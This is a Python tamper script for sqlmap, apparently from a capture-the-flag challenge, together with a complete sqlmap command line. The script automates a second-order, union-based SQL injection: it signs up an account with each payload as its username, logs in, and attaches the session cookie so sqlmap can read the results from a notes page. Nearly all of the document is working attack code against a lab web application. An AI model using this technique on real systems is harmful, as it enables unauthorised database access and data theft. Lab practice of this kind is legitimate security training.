#!/usr/bin/python
import requests
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.NORMAL
"""
sqlmap --tamper so-tamper.py --url http://10.10.1.134:5000/challenge4/signup --data "username=admin&password=asd" --second-url http://10.10.1.134:5000/challenge4/notes -p username --dbms=sqlite --technique=U

# --tamper so-tamper.py - The tamper script
# --url - The URL of the injection point, which is /signup in this case
# --data - The POST data from the registraion form to /signup.
# Password must be the same as the password in the tamper script
# --second-url http://10.10.1.134:5000/challenge4/notes - Visit this URL to check for results
# -p username - The parameter to inject to
# --dbms=sqlite - To speed things up
# --technique=U - The technique to use. [U]nion-based
# --no-cast - Turn off payload casting mechanism
"""
address = "http://10.10.1.134:5000/challenge4"
password = "asd"

def dependencies():
    pass

def create_account(payload):
    with requests.Session() as s:
        data = {"username": payload, "password": password}
        resp = s.post(f"{address}/signup", data=data)

def login(payload):
    with requests.Session() as s:
        data = {"username": payload, "password": password}
        resp = s.post(f"{address}/login", data=data)
        sessid = s.cookies.get("session", None)
    return "session={}".format(sessid)


def tamper(payload, **kwargs):
    headers = kwargs.get("headers", {})
    create_account(payload)
    headers["Cookie"] = login(payload)
    return payload

